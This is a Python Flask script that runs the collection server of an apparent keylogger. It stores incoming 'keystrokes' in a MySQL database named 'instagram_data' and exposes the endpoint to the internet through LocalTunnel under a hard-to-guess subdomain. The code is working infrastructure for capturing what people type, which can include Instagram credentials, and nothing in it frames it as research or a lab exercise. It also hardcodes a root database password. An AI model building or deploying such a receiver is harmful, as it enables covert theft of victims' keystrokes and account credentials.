import threading
import subprocess
import time
from flask import Flask, request, jsonify
import mysql.connector

app = Flask(__name__)

# === MySQL connection ===
db = mysql.connector.connect(
    host="localhost",
    user="root",
    password="password123",
    database="instagram_data"
)
cursor = db.cursor()

# === Ensure keystrokes table exists (no source_ip column) ===
cursor.execute("""
CREATE TABLE IF NOT EXISTS keystrokes (
    id INT AUTO_INCREMENT PRIMARY KEY,
    word TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
)
""")
db.commit()

# === Keystroke logging endpoint (accept GET and POST) ===
@app.route('/keystroke', methods=['GET', 'POST'])
def log_keystroke():
    if request.method == 'GET':
        # Avoid 405 errors by responding OK with a simple message on GET
        return jsonify({"message": "Send POST requests with keystrokes here."}), 200

    # POST request processing
    data = request.json
    word = data.get('word', '').strip()

    if not word:
        return jsonify({"error": "Empty word"}), 400

    try:
        cursor.execute("INSERT INTO keystrokes (word) VALUES (%s)", (word,))
        db.commit()
        print(f"[✓] Keystroke saved: '{word}'")
        return jsonify({"message": "Keystroke stored"}), 200
    except Exception as e:
        print("DB error (keystroke):", e)
        return jsonify({"error": "Failed to store keystroke"}), 500

# === Flask server runner ===
def run_flask():
    app.run(host="0.0.0.0", port=5000)

# === Main startup ===
def main():
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    time.sleep(3)

    local_port = 5000
    lt_subdomain = "insta947x-donkey-haxx-flipflop-b4nanalord-neverguess987"

    lt_executable = r"C:\Users\ACER\AppData\Roaming\npm\lt.cmd"  # Or just "lt" if in PATH

    print(f"[*] Starting LocalTunnel on port {local_port} with subdomain '{lt_subdomain}'...")

    lt_process = subprocess.Popen(
        [lt_executable, "--port", str(local_port), "--subdomain", lt_subdomain],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True,
        shell=True
    )

    public_url = None
    for line in lt_process.stdout:
        print("[LocalTunnel]", line.strip())
        if "your url is:" in line:
            public_url = line.strip().split("your url is:")[1].strip()
            print(f"\n✅ Public URL: {public_url}")
            break

    print("\n[✔] Flask server and LocalTunnel are running.")
    print("Press Ctrl+C to stop.")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nStopping LocalTunnel...")
        lt_process.terminate()
        print("Stopped.")

if __name__ == "__main__":
    main()
